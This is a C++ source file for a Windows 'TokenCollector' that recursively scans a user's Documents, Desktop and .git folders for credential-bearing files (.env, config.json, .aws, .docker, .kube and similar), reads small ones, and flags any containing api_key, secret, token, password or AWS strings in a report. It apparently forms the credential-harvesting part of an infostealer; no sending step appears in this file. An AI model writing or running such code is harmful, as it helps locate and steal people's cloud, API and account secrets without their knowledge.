#include "token_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <fstream>
#include <vector>

std::string TokenCollector::CollectTokens() {
    std::ostringstream result;
    result << "\n=== API TOKENS & KEYS ===\n";
    
    char userprofile[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, userprofile);
    
    std::vector<std::string> searchPaths = {
        std::string(userprofile) + "\\Documents",
        std::string(userprofile) + "\\Desktop",
        std::string(userprofile) + "\\.git"
    };
    
    std::vector<std::string> patterns = {".env", "config.json", "credentials", ".aws", ".docker", ".kube"};
    
    int foundCount = 0;
    for (const auto& searchPath : searchPaths) {
        if (!std::filesystem::exists(searchPath)) continue;
        
        for (const auto& pattern : patterns) {
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(searchPath)) {
                    if (p.is_regular_file() && foundCount < 30) {
                        std::string filename = p.path().filename().string();
                        std::string fullPath = p.path().string();
                        
                        if (filename == pattern || filename.find(pattern) != std::string::npos) {
                            result << "Found config: " << fullPath << "\n";
                            foundCount++;
                            
                            try {
                                auto fileSize = std::filesystem::file_size(p.path());
                                if (fileSize < 50000) { // Less than 50KB
                                    std::ifstream file(p.path());
                                    if (file.is_open()) {
                                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                                        
                                        if (content.find("api_key") != std::string::npos ||
                                            content.find("secret") != std::string::npos ||
                                            content.find("token") != std::string::npos ||
                                            content.find("password") != std::string::npos ||
                                            content.find("AWS") != std::string::npos) {
                                            result << ">>> CONTAINS SENSITIVE DATA! <<<\n";
                                        }
                                        
                                        file.close();
                                    }
                                }
                            } catch (...) {}
                        }
                    }
                }
            } catch (...) {
                // Skip
            }
            if (foundCount >= 30) break;
        }
        if (foundCount >= 30) break;
    }
    
    result << "Total configs scanned: " << foundCount << "\n";
    
    return result.str();
}
